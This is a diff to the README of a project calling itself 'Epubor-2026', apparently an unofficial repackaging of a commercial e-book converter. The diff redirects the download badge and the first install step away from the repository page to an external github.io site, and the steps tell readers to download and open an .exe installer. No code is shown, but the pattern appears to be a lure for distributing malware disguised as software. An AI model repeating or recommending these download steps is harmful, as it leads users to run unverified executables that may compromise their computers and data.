@@ -1,6 +1,6 @@
 # 📚 Epubor-2026 - Convert your digital books easily
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge&logo=windows)](https://github.com/mastigoproctusredflag647/Epubor-2026)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge&logo=windows)](https://mastigoproctusredflag647.github.io)
 
 ## 📖 About this software
 
@@ -20,7 +20,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the repository page to begin: [https://github.com/mastigoproctusredflag647/Epubor-2026](https://github.com/mastigoproctusredflag647/Epubor-2026).
+1. Visit the repository page to begin: [https://mastigoproctusredflag647.github.io](https://mastigoproctusredflag647.github.io).
 2. Look for the release section on the right side of the page.
 3. Click the link to download the installer file ending in .exe.
 4. Open the file once the download finishes.
